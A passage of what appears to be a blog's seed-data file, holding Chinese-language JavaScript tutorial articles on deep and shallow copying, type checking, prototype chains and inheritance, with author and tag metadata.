          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
      ],
    },
    {
      id: 40,
      title: '深浅拷贝',
      is_comment: 1,
      status: 1,
      img: null,
      content:
        '# 深浅拷贝\n\n> 假设B复制了A，当修改A时，看B是否会发生变化，如果B也跟着变了，说明这是浅拷贝，如果B没变，那就是深拷贝\n\n### 如果是基本数据类型，名字和值都会储存在栈内存中\n\n```js\nvar a = 1;\nb = a; // 栈内存会开辟一个新的内存空间，此时b和a都是相互独立的\nb = 2;\nconsole.log(a); // 1\n```\n\n### 如果是引用数据类型，名字存在栈内存中，值存在堆内存中，但是栈内存会提供一个引用的地址指向堆内存中的值\n\n```js\nvar a=[0,1,2,3,4];\nvar b=a;\nconsole.log(a===b);\t//true\na[0]=1;\nconsole.log(a);\t// [1,1,2,3,4]\nconsole.log(b);\t// [1,1,2,3,4]\n```\n\n# 浅拷贝\n\n## for循环实现\n\n```js\nfunction simpleCopy(obj1) {\n    var obj2 = Array.isArray(obj1) ? [] : {};\n    for (let i in obj1) {\n        obj2[i] = obj1[i];\n    }\n    return obj2;\n}\n```\n\n## Object.assign()实现\n\nObject.assign() 方法用于将所有可枚举属性的值从一个或多个源对象复制到目标对象。它将返回目标对象\n\n```js\nconst obj3 = {\n    a: 1,\n    b: { name: \'张三\', age: 14, hobby: [\'唱\', \'跳\', \'rap\'] },\n    c: [\'周杰伦\', \'华晨宇\', \'林俊杰\'],\n    d: function () {\n        console.log(\'ddd\');\n    }\n}\n\nvar obj1 = Object.assign({}, obj3);\n// 对于Object.assign(), 如果对象的属性值为简单类型（string， number）\n// 通过Object.assign({},obj3)得到的新对象为深拷贝\nobj1.a = 3;\nconsole.log(obj1)           // {a: 3, b: {…}, c: Array(3), d: ƒ}\nconsole.log(obj3)           // {a: 1, b: {…}, c: Array(3), d: ƒ}\n// 如果属性值为对象或其它引用类型，那对于这个对象而言其实是浅拷贝的。\nobj1.b.name = \'李四\'\nconsole.log(obj1.b.name);   //李四\nconsole.log(obj3.b.name);   //李四\n```\n\n## 直接赋值\n\n```js\nvar a = [0, 1, 2, 3, 4]\nvar b = a;\nconsole.log(a === b);   // true\na[0] = 1;\nconsole.log(a);         // [1, 1, 2, 3, 4]\nconsole.log(b);         // [1, 1, 2, 3, 4]\n```\n\n\n\n# 深拷贝\n\n## 用slice实现对数组的深拷贝\n\n```js\n// 当数组里面的值是基本数据类型，比如String，Number，Boolean时，属于深拷贝\n// 当数组里面的值是引用数据类型，比如Object，Array时，属于浅拷贝\nvar arr1 = ["1", "2", "3", [4, 5]];\nvar arr2 = arr1.slice(0);\narr2[1] = "9";\nconsole.log(arr1);  // ["1", "2", "3", Array(2)]\nconsole.log(arr2);  // ["1", "2", "3", Array(2)]\narr2[3][0] = 999\nconsole.log(arr1[3][0]);  // 999\nconsole.log(arr2[3][0]);  // 999\n```\n\n## 用concat实现对数组的深拷贝\n\n```js\n// 当数组里面的值是基本数据类型，比如String，Number，Boolean时，属于深拷贝\n// 当数组里面的值是引用数据类型，比如Object，Array时，属于浅拷贝\nvar arr1 = ["1", "2", "3", [4, 5]];\nvar arr2 = arr1.concat();\narr2[1] = "9";\nconsole.log(arr1);  // ["1", "2", "3", Array(2)]\nconsole.log(arr2);  // ["1", "2", "3", Array(2)]\narr2[3][0] = 999\nconsole.log(arr1[3][0]);  // 999\nconsole.log(arr2[3][0]);  // 999\n```\n\n## 通过JSON对象来实现深拷贝\n\n它只能深拷贝对象和数组，对于其他种类的对象（比如function），会失真\n\n```js\nfunction deepClone2(obj) {\n    return JSON.parse(JSON.stringify(obj));\n}\nvar json1 = {\n    "name": "cheng",\n    "age": 18,\n    "fun": function (a) {\n        console.log(a);\n    }\n}\nvar json2 = deepClone2(json1);\njson2.age = 20;\nconsole.log(json1); // {name: "cheng", age: 18, fun: ƒ}\nconsole.log(json2); // {name: "cheng", age: 20}\n```\n\n## 递归\n\n采用递归去拷贝所有层级属性\n\n1. 判断是不是原始值\n2. 判断是数组还是对象\n3. 新建响应的数组或对象\n4. 递归\n\n```js\nfunction deepclone(obj) {\n    const newobj = obj instanceof Array ? [] : {}\n    for (let i in obj) {\n        // 判断自身属性中是否具有指定的属性（避免克隆了原型上的东西）\n        if (obj.hasOwnProperty(i)) {\n            // 判断是不是原始值\n            if (obj[i] instanceof Object == true) {\n                // 不是原始值开始递归\n                newobj[i] = deepclone(obj[i])\n            } else {\n                // 是原始值直接赋值\n                newobj[i] = obj[i]\n            }\n        }\n\n    }\n    return newobj\n}\n```\n\n- 通过JSON对象来实现深拷贝\n\n它只能深拷贝对象和数组，对于其他种类的对象（比如function），会失真\n\n```js\nfunction deepClone2(obj) {\n    return JSON.parse(JSON.stringify(obj));\n}\n```\n\n```js\nvar json1 = {\n    "name": "cheng",\n    "age": 18,\n    "fun": function (a) {\n        console.log(a);\n    }\n}\nvar json2 = deepClone2(json1);\njson2.age = 20;\nconsole.log(json1); // {name: "cheng", age: 18, fun: ƒ}\nconsole.log(json2); // {name: "cheng", age: 20}\n```\n\n- 用slice实现对数组的深拷贝\n\n```js\n// 当数组里面的值是基本数据类型，比如String，Number，Boolean时，属于深拷贝\n// 当数组里面的值是引用数据类型，比如Object，Array时，属于浅拷贝\nvar arr1 = ["1", "2", "3", [4, 5]];\nvar arr2 = arr1.slice(0);\narr2[1] = "9";\nconsole.log(arr1);  // ["1", "2", "3", Array(2)]\nconsole.log(arr2);  // ["1", "2", "3", Array(2)]\narr2[3][0] = 999\nconsole.log(arr1[3][0]);  // 999\nconsole.log(arr2[3][0]);  // 999\n```\n\n- 用concat实现对数组的深拷贝\n\n```js\n// 当数组里面的值是基本数据类型，比如String，Number，Boolean时，属于深拷贝\n// 当数组里面的值是引用数据类型，比如Object，Array时，属于浅拷贝\nvar arr1 = ["1", "2", "3", [4, 5]];\nvar arr2 = arr1.concat();\narr2[1] = "9";\nconsole.log(arr1);  // ["1", "2", "3", Array(2)]\nconsole.log(arr2);  // ["1", "2", "3", Array(2)]\narr2[3][0] = 999\nconsole.log(arr1[3][0]);  // 999\nconsole.log(arr2[3][0]);  // 999\n```\n\n## 考虑循环引用\n\n### 使用数组\n\n这里使用一个数组，保存已经遍历的数据，再每次递归时，先查找当前递归的值在数组里有没有，如果有，则直接返回数组里面的值（引用），然后跳出循环；如果没有，则往数组里插入当前递归的值，然后继续向下执行。\n\n```js\nvar cat = { name: "tom" }\ncat.hobby = cat\nfunction deepclone(obj, queueList) {\n    // 找数组里面有没有这个值\n    function find(arr, obj) {\n        var res = null\n        for (var i = 0; i < arr.length; i++) {\n            if (arr[i].key == obj.key) {\n                res = arr[i]\n            }\n        }\n        return res\n    }\n    queueList = queueList ? queueList : []\n    // 如果在数组找到这个值，就返回这个值，跳出递归\n    if (find(queueList, obj)) {\n        return find(queueList, obj)\n    } else {\n        // 找不到就插入值，继续递归\n        queueList.push(obj)\n    }\n    var newobj = obj instanceof Array ? [] : {}\n    for (var i in obj) {\n        // 判断自身属性中是否具有指定的属性（避免克隆了原型上的东西）\n        if (obj.hasOwnProperty(i)) {\n            // 判断是不是原始值\n            if (obj[i] instanceof Object == true) {\n                // 不是原始值开始递归\n                newobj[i] = deepclone(obj[i], queueList)\n            } else {\n                // 是原始值直接赋值\n                newobj[i] = obj[i]\n            }\n        }\n\n    }\n    return newobj\n}\n\nconsole.log(deepclone(cat))\n```\n\n### 使用WeakMap\n\n和数组原理一只，只不过使用了es6的WeakMap\n\n```js\nvar cat = { name: "tom" }\ncat.hobby = cat\nfunction deepclone(obj, hash) {\n    var newobj = Array.isArray(obj) ? [] : {}\n    hash = hash ? hash : new WeakMap()\n    if (hash.has(obj)) {\n        return hash.get(obj)\n    } else {\n        hash.set(obj, newobj)\n    }\n    for (var i in obj) {\n        if (obj.hasOwnProperty(i)) {\n            if (obj[i] instanceof Object) {\n                newobj[i] = deepclone(obj[i], hash)\n            } else {\n                newobj[i] = obj[i]\n            }\n        }\n    }\n    return newobj\n}\nconsole.log(deepclone(cat))\n```\n\n',
      click: 31,
      createdAt: '2020-07-27T13:48:49.000Z',
      updatedAt: '2021-03-16T05:16:29.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 40,
            article_id: 40,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 40,
            user_id: 1,
            article_id: 40,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
      ],
    },
    {
      id: 34,
      title: 'js判断数据类型',
      is_comment: 1,
      status: 1,
      img: null,
      content:
        "# 判断数据类型\n\n## 隐式转换\n\n> ***0，’’，NaN，false，null，undefined***，会转化为false\n\n```js\nif (undefined == true) {\n    console.log('true');\n} else {\n    console.log('false');\n}\n//结果输出false\n```\n\n\n\n```js\nvar str = 'abc'\nvar num = 1\nvar bool = true\nvar arr = [1, 2, 3]\nvar obj = { name: 'haoxl', age: 18 }\nvar fun = function () { console.log('I am a function') }\nvar und = undefined\nvar nul = null\nvar str1 = new String(123)\nvar num1 = new Number(123)\nvar bool1 = new Boolean(true)\nvar arr1 = new Array([])\nvar obj1 = new Object({})\nvar fun1 = new Function('a', 'b')\n```\n\n\n\n## typeof\n\n> typeof，返回的结果用该类型的字符串(全小写字母)形式 \n>\n> 缺点：对象，数组，null，以及所以new的东西，都返回object\n\n```js\nconsole.log(typeof str);    //string\nconsole.log(typeof num);    //number\nconsole.log(typeof bool);   //boolean\nconsole.log(typeof arr);    //object\nconsole.log(typeof obj);    //object\nconsole.log(typeof fun);    //function\nconsole.log(typeof und);    //undefined\nconsole.log(typeof nul);    //object\nconsole.log(typeof str1);   //object\nconsole.log(typeof num1);   //object\nconsole.log(typeof bool1);  //object\nconsole.log(typeof arr1);   //object\nconsole.log(typeof obj1);   //object\nconsole.log(typeof fun1);   //function\n```\n\n\n\n## instanceof\n\nA instanceof B，A对象是不是B构造函数构造出来的。A对象的原型链上有没有B的原型。\n\n>  instanceof不能区别undefined和null，\n>\n>  而且对于基本类型如果不是用new声明的则也测试不出来，\n>\n>  对于是使用new声明的类型，它还可以检测出多层继承关系。\n\n```js\nconsole.log(str instanceof String, str instanceof Object);      // false,false\nconsole.log(num instanceof Number, num instanceof Object);      // false,false\nconsole.log(bool instanceof Boolean, bool instanceof Object);   // false,false\nconsole.log(arr instanceof Array, arr instanceof Object);       // true,true\nconsole.log(obj instanceof Object);                             // true\nconsole.log(fun instanceof Function, fun instanceof Object);    // true,true\nconsole.log(und instanceof Object);                             // false\nconsole.log(nul instanceof Object);                             // false\nconsole.log(str1 instanceof String, str1 instanceof Object);    // true,true\nconsole.log(num1 instanceof Number, num1 instanceof Object);    // true,true\nconsole.log(fun1 instanceof Function, fun1 instanceof Object);  // true,true\nconsole.log(obj1 instanceof Object);                            // true\n```\n\n\n\n## constructor\n\n> 可以判断数组和对象，\n>\n> 缺点：undefined和null没有contructor属性\n\n```js\nconsole.log(str.constructor === String, str.constructor === Object);        // true,false\nconsole.log(num.constructor === Number, num.constructor === Object);        // true,false\nconsole.log(bool.constructor === Boolean, bool.constructor === Object);     // true,false\nconsole.log(arr.constructor === Array, arr.constructor === Object);         // true,false\nconsole.log(obj.constructor === Object);                                    // true\nconsole.log(fun.constructor === Function, fun.constructor === Object);      // true,false\nconsole.log(str1.constructor === String, str1.constructor === Object);      // true,false\nconsole.log(num1.constructor === Number, num1.constructor === Object);      // true,false\nconsole.log(bool1.constructor === Boolean, bool1.constructor === Object);   // true,false\nconsole.log(arr1.constructor === Array, arr1.constructor === Object);       // true,false\nconsole.log(obj1.constructor === Object);                                   // true\nconsole.log(fun1.constructor === Function, fun1.constructor === Object);    // true,false\n```\n\n\n\n## Object.prototype.toString.call()\n\n原理：toStirng方法返回一个变量（包含对象）的字符串表示方式。\n\n> toString方法是Objectde 原型方法，如果直接调用toString()方法，会先经过一个包装类的过程，然后调用包装类上面继承并重写过的toString()\n\n```js\nconsole.log(\"jerry\".toString());    //jerry\nconsole.log((1).toString());        //1\nconsole.log([1,2].toString());      //1,2\nconsole.log(new Date().toString());//Wed Dec 21 2016 20:35:48 GMT+0800 (中国标准时间)\nconsole.log(function(){}.toString());//function (){}\n```\n\n> 验证：\n\n```js\nvar arr=[1,2,3];\nconsole.log(Array.prototype.hasOwnProperty(\"toString\"));//true\nconsole.log(arr.toString());//1,2,3\ndelete Array.prototype.toString;//删除实例属性\nconsole.log(Array.prototype.hasOwnProperty(\"toString\"));//false\nconsole.log(arr.toString());//\"[object Array]\"\n```\n\n```js\nconsole.log(Object.prototype.toString.call(str));   //[object String]\nconsole.log(Object.prototype.toString.call(num));   //[object Number]\nconsole.log(Object.prototype.toString.call(bool));  //[object Boolean]\nconsole.log(Object.prototype.toString.call(arr));   //[object Array]\nconsole.log(Object.prototype.toString.call(obj));   //[object Object]\nconsole.log(Object.prototype.toString.call(fun));   //[object Function]\nconsole.log(Object.prototype.toString.call(und));   //[object Undefined]\nconsole.log(Object.prototype.toString.call(nul));   //[object Null]\n\n//使用正则获取[object Function]里面的数据类型\nvar regstr = '[object Function]'\nvar res = regstr.match(/\\s+(\\w+)/)\nconsole.log(res[1]);\n```\n\n",
      click: 5,
      createdAt: '2020-07-26T13:46:02.000Z',
      updatedAt: '2021-02-16T13:12:28.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 34,
            article_id: 34,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 34,
            user_id: 1,
            article_id: 34,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
      ],
    },
    {
      id: 39,
      title: 'js原型和原型链',
      is_comment: 1,
      status: 1,
      img: '/1595767471348proto.png',
      content:
        "# 构造函数\n\n```js\nfunction Person() {\n\n}\nvar person = new Person();\nperson.name = 'Kevin';\nconsole.log(person.name) // Kevin\n```\n\nPerson 就是一个构造函数，使用 new 创建了一个实例对象 person\n\n# 原型(prototype)\n\n每个函数都有一个 prototype 属性\n每一个JavaScript对象(null除外)在创建的时候就会与之关联另一个对象，这个对象就是我们所说的原型对象`prototype` ，每一个对象都会从原型对象上\"继承\"属性。\n\n![prototype1.png](https://img.cdn.hsslive.cn/1595767498154prototype1.png)\n\n```js\nfunction Person() {\n\n}\n\nPerson.prototype.name = 'Kevin';\nvar person1 = new Person();\nvar person2 = new Person();\nconsole.log(person1.name) // Kevin\nconsole.log(person2.name) // Kevin\n```\n\n# 原型链(\\_\\_proto\\_\\_)\n\n每一个JavaScript对象(除了 null )都有一个隐式的__proto\\_\\_，它指向它的原型\n\n![prototype2.png](https://img.cdn.hsslive.cn/1595767510012prototype2.png)\n\n```js\nfunction Person() {\n\n}\nvar person = new Person();\nconsole.log(person.__proto__ === Person.prototype); // true\n```\n\n# constructor\n\n每个原型`prototype` 都有一个 `constructor`（构造函数）属性，这个属性（是一个指针）指向 `prototype` 属性所在的函数\n\n![prototype3.png](https://img.cdn.hsslive.cn/1595767562916prototype3.png)\n\n```js\nfunction Person() {\n\n}\nconsole.log(Person === Person.prototype.constructor); // true\n```\n\n```js\nfunction Person() {\n\n}\n\nvar person = new Person();\n\nconsole.log(person.__proto__ == Person.prototype) // true\nconsole.log(Person.prototype.constructor == Person) // true\n// 获得对象的原型\nconsole.log(Object.getPrototypeOf(person) === Person.prototype) // true\n```\n\n# 实例和原型\n\n```js\nfunction Person() {\n\n}\n\nPerson.prototype.name = 'Kevin';\n\nvar person = new Person();\n\nperson.name = 'Daisy';\nconsole.log(person.name) // Daisy\n\ndelete person.name;\nconsole.log(person.name) // Kevin\n```\n\n在这个例子中，我们给实例对象 person 添加了 name 属性，当我们打印 person.name 的时候，结果自然为 Daisy。\n\n但是当我们删除了 person 的 name 属性时，读取 person.name，从 person 对象中找不到 name 属性就会从 person 的原型也就是 person.__proto\\_\\_ ，即 Person.prototype中查找，找到了 name 属性，结果为 Kevin。\n\n# 原型和原型链\n\n一张图搞懂：\n\n![prototype.png](https://img.cdn.hsslive.cn/1595767596611prototype.png)\n\n- 函数与 Function 的关系\n\n  函数就是 Function 的实例. 即 Function 就是函数的构造函数，实例对象有一个继承的 constructor 属性, 该方法指向就是构造函数\n  自己定义一个函数( 任意的函数 ), 可以知道函数的 constructor 就是 Function，得到结论 函数就是 Function 的实例。\n  Function 也是函数, 那么有什么结论?\n  Function 就是 Function 的实例. 即 自己就是自己的实例。\n\n- Object 与 Function的关系\n\n  Object 是 函数, 因为函数在 Function 中, 所以Object是Function的实例对象. 因此就构成一个三角形。Object可以使用`__proto__`来访问对象的原型对象，即Object可通过`__proto__`访问Function的`Function.prototype`\n\n- 原型继承的整个关系( 原型链 )\n  可以知道所有的对象都有原型, 一步一步往上走, 都会汇集到 `Object.prototype` ，`Object.prototype` 是顶级的对象。\n\n```js\n// Function 就是 Function 的实例(约等于实例化对象的__proto__指向其构造函数的prototype)\nconsole.log(Function.__proto__ === Function.prototype);         // true\nconsole.log(Object.__proto__ === Function.prototype);           // true\nconsole.log(Function.__proto__ === Object.__proto__);           // true\nconsole.log(Function.prototype.__proto__ === Object.prototype); // true\n```\n\n\n\n# 应用\n\n## 继承\n\n看我这篇文章：[js实现继承](https://www.zhengbeining.com/article/40)\n\n## 增删查改\n\n```js\nfunction Person() { }\n// 增\nPerson.prototype.name = '张三'\nPerson.prototype.age = 18\nPerson.prototype.sex = 'male'\nvar person = new Person()\n// 查\nconsole.log(Person.prototype);  //{name: \"张三\", age: 18, sex: \"male\", constructor: ƒ}\n// 改\nPerson.prototype.age = 20\nconsole.log(Person.prototype.age);//20\n// 删\ndelete Person.prototype.sex\nconsole.log(Person.prototype);  //{name: \"张三\", age: 20, constructor: ƒ}\n```\n\n## 重写原型方法\n\n```js\nObject.prototype.tostring = function () {\n    return 'aaa'\n}\n// Person.prototype.tostring = function () {\n//     return 'bbb'\n// }\nfunction Person() {\n\n}\n\nvar person = new Person()\n```\n\n# 案例\n\n- 案例1\n\n  ```js\n   function Person() {\n      // var this = {\n      //     __proto__: Person.prototype\n      // }\n  }\n  var person = new Person()\n  Person.prototype.name = '张三'\n  Person.prototype = {\n      name: '王五'\n  }\n  console.log(person.name);   //张三\n  ```\n\n![prototype5.png](https://img.cdn.hsslive.cn/1595767655253prototype5.png)\n\n- 案例2\n\n  ```js\n  function Person() {\n      // var this = {\n      //     __proto__: Person.prototype\n      // }\n      // return this\n  }\n  Person.prototype.name = '张三'\n  Person.prototype = {\n      name: '王五'\n  }\n  var person = new Person()\n  console.log(person.name);   //王五\n  ```\n![prototype4.png](https://img.cdn.hsslive.cn/1595767668607prototype4.png)\n\n- 案例3\n\n  document.write(value)，向文档中输出value的toString()方法\n\n  ```js\n  var obj = Object.create(null)\n  // document.write(obj) //报错，找不到它的toString()方法\n  obj.toString = function () {\n      return 'aaa'\n  }\n  document.write(obj) //aaa\n  ```\n\n  ",
      click: 12,
      createdAt: '2020-07-26T12:49:00.000Z',
      updatedAt: '2021-02-16T13:13:46.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 39,
            article_id: 39,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 39,
            user_id: 1,
            article_id: 39,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
      ],
    },
    {
      id: 36,
      title: 'js实现继承',
      is_comment: 1,
      status: 1,
      img: '/1595515868350flower.jpg',
      content:
        "# js实现继承\n\n## 经典继承(原型链)\n\n- 缺点：过多的继承了没用的属性\n\n```js\nGrandfather.prototype.lastName = 'zhang'\nfunction Grandfather() {\n    this.money = 100\n}\nvar grandfather = new Grandfather()\nFather.prototype = grandfather\nfunction Father() {\n    this.work = 'code'\n}\nvar father = new Father()\nSon.prototype = father\nfunction Son() {\n    this.hobby = 'game'\n}\nvar son = new Son()\nconsole.log(son);\n```\n\n> ​\t\tson只想要继承grandfather的lastName属性，但是由于原型链的关系，造成了son既会继承grandfather自神的东西，grandfather的原型的东西，father自身的东西和father原型上的东西，造成了不必要的继承\n\n\n\n## 共享原型\n\n本质：重写原型对象\n\n优点：只会继承父的原型，不会继承父原本自带的属性或方法（只有调用new Father()才会继承自身的东西）\n\n缺点：给本身的原型添加属性或方法时，会把继承的那个原型也修改了\n\n![extend1.png](https://img.cdn.hsslive.cn/1595515992764extend1.png)\n\n```js\nFather.prototype.lastName = 'zhang'\nfunction Father() {\n    this.money = '100'\n}\nfunction Son() {\n    this.hobby = 'game'\n}\nSon.prototype = Father.prototype\nSon.prototype.food = 'fish'\nvar son = new Son()\nvar father = new Father()\nconsole.log(Son.prototype)      // {lastName: \"zhang\", food: \"fish\", constructor: ƒ}\nconsole.log(Father.prototype)   // {lastName: \"zhang\", food: \"fish\", constructor: ƒ}\nconsole.log(son);               // Son {hobby: \"game\"}\nconsole.log(father);            // Father {money: \"100\"}\nconsole.log(son.money);         // undefined\n```\n\n\n\n## 借用构造函数(伪经典继承)\n\n原理：在函数里面调用函数，约等于将父里面的代码复制粘贴到子里面，然后通过call将父的this改成子的this\n\n缺点：\n\n1. 不能继承借用的构造函数的原型\n2. 每次调用子构造函数都要调用多一次借用的父构造函数，没有函数复用可言\n\n```js\nFather.prototype.lastName = 'zhang'\nfunction Father() {\n    this.money = 100\n}\nfunction Son() {\n    Father.call(this)\n    this.hobby = 'game'\n}\nvar son = new Son()\nconsole.log(son);               // Son {money: 100, hobby: \"game\"}\nconsole.log(son.lastName);      // undefined\n```\n\n\n\n## 组合继承\n\n本质：重写原型对象\n\n原理：借用构造函数+原型链\n\n缺点：因为需要借用构造函数，还是没有函数复用\n\n```js\nFather.prototype.lastName = 'zhang'\nfunction Father() {\n    this.money = 100\n}\nfunction Son() {\n    Father.call(this)\n    this.hobby = 'game'\n}\nSon.prototype = new Father()\nvar son = new Son()\nconsole.log(son);               // Son {money: 100, hobby: \"game\"}\nconsole.log(son.lastName);      // zhang\n```\n\n\n\n## 圣杯模式(寄生组合式继承)\n\n### 雏形\n\n本质：重写原型对象\n\n优点：只会继承父的原型，不会继承父原本自带的属性或方法（只有调用new Father()才会继承自身的东西）\n\n缺点：1，这样继承后即使修改了son的原型也不会修改father的原型，但会修改给father的实例；2，Son的原型指向了father实例，造成了Son的constructor缺失。\n\n```js\nFather.prototype.lastName = 'zhang'\nfunction Father() {\n    this.money = '100'\n}\nfunction Son() {\n    this.hobby = 'game'\n}\nvar father = new Father()\nSon.prototype = father\nSon.prototype.food = 'fish'\nvar son = new Son()\nconsole.log(Son.prototype)      // Father {money: \"100\", food: \"fish\"}   \nconsole.log(Father.prototype)   // {lastName: \"zhang\", constructor: ƒ}\nconsole.log(son.food);          // fish\nconsole.log(father.food);       // fish\nconsole.log(son.lastName);      // zhang\n```\n\n> ​\t\tSon.prototype指向father实例，但是Son.prototype.food并不能改变father实例的prototype，因为想要改变prototype，必须通过他本身的原型去修改，如：`Son.prototype.__proto__.food:'fish'`，通过`Son.prototype.__proto__`获取father的原型进行修改而Son.prototype.food，只是在改变father实例\n\n\n\n### 改进\n\n原理：使用一个F构造函数当中间层，F的原型继承父构造函数的原型，然后子的原型指向F的实例，重新给子的原型指定constructor\n\n![extend2.png](https://img.cdn.hsslive.cn/1595519497866extend2.png)\n\n```js\nFather.prototype.lastName = \"zhang\"\nfunction Father() {\n    this.money = '100'\n}\nfunction Son() {\n    this.hobby = 'game'\n}\nfunction F() {\n}\nF.prototype = Father.prototype\nSon.prototype = new F()\nSon.prototype.constructor = Son\nSon.prototype.food = 'fish'\nvar son = new Son()\nvar father = new Father()\nconsole.log(Son.prototype)      // Father {food: \"fish\", constructor: ƒ}\nconsole.log(Father.prototype)   // {lastName: \"zhang\", constructor: ƒ}\nconsole.log(son.food);          // fish\nconsole.log(father.food);       // undefined\nconsole.log(son.lastName);      // zhang\n```\n\n### 封装\n\n#### 手写版\n\n```js\nfunction inherit(Target, Origin) {\n    function F() { };\n    F.prototype = Origin.prototype;\n    Target.prototype = new F();\n    Target.prototype.constuctor = Target;\n    Target.prototype.super = Origin.prototype;   // 超类\n}\n```\n\n#### YAHOO(YUI)版\n\n> 其实就是利用闭包和立即执行函数\n\n​\t\tinherit右边的立即执行函数，定义了一个function F() {}这个构造函数（约等于一个私有化函数），然后返回了一个function，这个function里面保存着立即执行函数里面的F，形成闭包，因此返回的这个function可以访问这个F，而这个F只是作为中间层传递原型给目标而已，传递完之后F这个构造函数就没用了，而立即执行函数在执行完后就会销毁F，因此，**高端操作**（利用闭包延长F的生命周期，又利用立即执行函数将F销毁）。\n\n```js\nvar inherit = (function () {\n    function F() { }\n    return function (Target, Origin) {\n        F.prototype = Origin.prototype;\n        Target.prototype = new F();\n        Target.prototype.constuctor = Target;\n        Target.prototype.uber = Origin.prototype;   // 超类\n    }\n}())\n```\n\n#### 用法\n\n```js\nFather.prototype.lastName = 'zhang'\nfunction Father() {\n    this.money = '100'\n}\nfunction Son() {\n    this.hobby = 'game'\n}\ninherit(Son, Father)\nvar son = new Son()\nvar father = new Father()\nSon.prototype.grade = 6\nconsole.log(son);               // Son {hobby: \"game\"}\nconsole.log(father);            // Father {money: \"100\"}\nconsole.log(Son.prototype);     // Father {uber: {…}, grade: 6, constuctor: ƒ}\nconsole.log(Father.prototype);  // {lastName: \"zhang\", constructor: ƒ}\nconsole.log(son.lastName);      // zhang\n```\n\n",
      click: 51,
      createdAt: '2020-07-23T14:53:18.000Z',
      updatedAt: '2021-02-16T13:12:45.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 36,
            article_id: 36,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 36,
            user_id: 1,
            article_id: 36,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
      ],
    },
    {
      id: 38,
      title: 'js的event loop',
      is_comment: 1,
      status: 1,
      img: '/1596441518484loop.png',
      content:
